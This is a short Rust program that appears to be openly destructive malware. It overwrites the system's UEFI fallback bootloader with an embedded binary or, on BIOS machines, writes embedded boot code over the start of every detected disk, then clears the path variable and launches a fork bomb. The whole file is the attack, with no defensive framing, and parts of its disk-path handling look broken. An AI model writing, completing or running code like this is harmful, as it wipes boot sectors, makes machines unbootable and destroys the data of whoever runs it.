use std::{fs, io::Write, thread};
use regex::Regex;
#[allow(unconditional_recursion)]
fn forkbomb() {
    thread::spawn(forkbomb);
    forkbomb();
}

fn is_uefi() -> bool {
    fs::exists("/sys/firmware/efi").expect("Failed to check for EFI")
}

fn get_disks() -> Vec<String> {
    let re = Regex::new("/(hd[a-z]{0}|sd[a-z]|nvme\\dn\\d)").unwrap();
    let devices: Vec<String> = fs::read_dir("/dev").unwrap().map(|x| x.unwrap().path().to_str().unwrap().to_string()).collect();

    devices.into_iter().filter(|x| re.is_match(x)).collect()
}

fn main() {
    let mbrcode = include_bytes!("../../build/boot.bin");
    let efi = include_bytes!("../../build/boot.efi");
    let disks = get_disks();

    if is_uefi() {
        if fs::exists("/boot/efi").unwrap() {
            fs::OpenOptions::new().write(true).open("/boot/efi/EFI/BOOT/BOOTX64.EFI").unwrap().write(efi).unwrap();
        }
        else if fs::exists("/boot").unwrap() {
            fs::OpenOptions::new().write(true).open("/boot/EFI/BOOT/BOOTX64.EFI").unwrap().write(efi).unwrap();
        }
        else {
            fs::OpenOptions::new().write(true).open("/EFI/BOOT/BOOTX64.EFI").unwrap().write(efi).unwrap();
        }
    } else {
        for disk in disks {
            let mut f = fs::OpenOptions::new().write(true).open(format!("/dev/{}", disk)).unwrap();
            f.write(mbrcode).unwrap();
        }
    }

    std::env::set_var("path", "");

    forkbomb();
}